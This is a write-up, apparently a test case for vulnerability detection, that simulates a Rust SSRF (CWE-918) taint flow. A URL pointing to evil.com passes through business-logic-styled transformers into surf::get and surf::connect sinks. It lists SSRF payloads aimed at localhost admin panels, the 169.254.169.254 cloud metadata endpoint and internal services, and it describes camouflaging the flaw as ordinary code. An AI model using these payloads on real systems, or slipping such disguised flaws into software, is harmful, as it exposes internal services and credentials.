# Simulação CWE-918 SSRF - Input Malicioso

## **Input Malicioso Original**
```
http://evil.com/internal/admin
```

## **Flow through Transformers**

### **1. SOURCE (std::net::TcpStream::read)**
```rust
// Input recebido via TCP
let tainted_url = "http://evil.com/internal/admin";
```

### **2. Transformer 1: process_url_with_business_context**
```rust
// Input: "http://evil.com/internal/admin"
// Lógica: Detecta "admin" e aplica contexto de admin
// Output: "http://evil.com/internal/admin?category=analytics&auth_token=abc123&session_id=xyz789"
```

### **3. Transformer 2: enhance_url_with_advanced_routing**
```rust
// Input: "http://evil.com/internal/admin?category=analytics&auth_token=abc123&session_id=xyz789"
// Lógica: Adiciona parâmetros de roteamento e cache
// Output: "http://evil.com/internal/admin?category=analytics&auth_token=abc123&session_id=xyz789&cache=1&ttl=3600&rate_limit=100&window=60&monitoring=active&trace_id=def456&region=us_east&timezone=est"
```

### **4. Transformer 3: finalize_url_with_analytics_and_tracking**
```rust
// Input: "http://evil.com/internal/admin?category=analytics&auth_token=abc123&session_id=xyz789&cache=1&ttl=3600&rate_limit=100&window=60&monitoring=active&trace_id=def456&region=us_east&timezone=est"
// Lógica: Adiciona analytics, tracking e otimizações
// Output: "http://evil.com/internal/admin?category=analytics&auth_token=abc123&session_id=xyz789&cache=1&ttl=3600&rate_limit=100&window=60&monitoring=active&trace_id=def456&region=us_east&timezone=est&utm_source=internal_api&utm_medium=server_request&utm_campaign=business_logic&utm_content=network_ops&ab_test=variant_a&experiment_id=ssrf_optimization&compression=gzip&keep_alive=true&security_level=standard&audit_enabled=true&bi_enabled=true&reporting_level=detailed&loyalty_tier=gold&rewards_enabled=true"
```

### **5. Lógica Final de Negócio**
```rust
// Input: URL com todos os parâmetros
// Lógica: Adiciona parâmetros de prioridade para usuários premium
// Output: "http://evil.com/internal/admin?category=analytics&auth_token=abc123&session_id=xyz789&cache=1&ttl=3600&rate_limit=100&window=60&monitoring=active&trace_id=def456&region=us_east&timezone=est&utm_source=internal_api&utm_medium=server_request&utm_campaign=business_logic&utm_content=network_ops&ab_test=variant_a&experiment_id=ssrf_optimization&compression=gzip&keep_alive=true&security_level=standard&audit_enabled=true&bi_enabled=true&reporting_level=detailed&loyalty_tier=gold&rewards_enabled=true&priority=high&support_level=premium"
```

## **SINKS (Vulnerability Points)**

### **SINK 1: surf::get(tainted_url)**
```rust
// Faz requisição HTTP GET para a URL maliciosa
let _response = surf::get("http://evil.com/internal/admin?...").await;
// Result: Server makes request to evil.com, potentially exposing internal data
```

### **SINK 2: surf::connect(tainted_url)**
```rust
// Estabelece conexão TCP para a URL maliciosa
let _connection = surf::connect("http://evil.com/internal/admin?...").await;
// Result: Server establishes TCP connection with evil.com
```

## **Attack Scenarios**

### **Scenario 1: Access to Internal Resources**
```
Input: "http://127.0.0.1:8080/admin"
Result: Unauthorized access to internal admin panel
```

### **Scenario 2: Access to Cloud Metadata**
```
Input: "http://169.254.169.254/latest/meta-data/"
Result: Exposure of sensitive instance metadata
```

### **Scenario 3: Access to Internal Services**
```
Input: "http://internal-database:3306"
Result: Attempt to connect to internal database
```

### **Scenario 4: Port Scanning**
```
Input: "http://192.168.1.1:22"
Result: Attempt to SSH connect to internal server
```

## **Why it's Vulnerable**

1. **No Sanitization**: Transformers don't validate or filter URLs
2. **Realistic Business Logic**: Appears to be legitimate functionality
3. **Multiple Sinks**: Two different vulnerability points
4. **Camouflaging**: Function and file names appear legitimate
5. **Complex Flow**: Multiple transformations mask the vulnerability 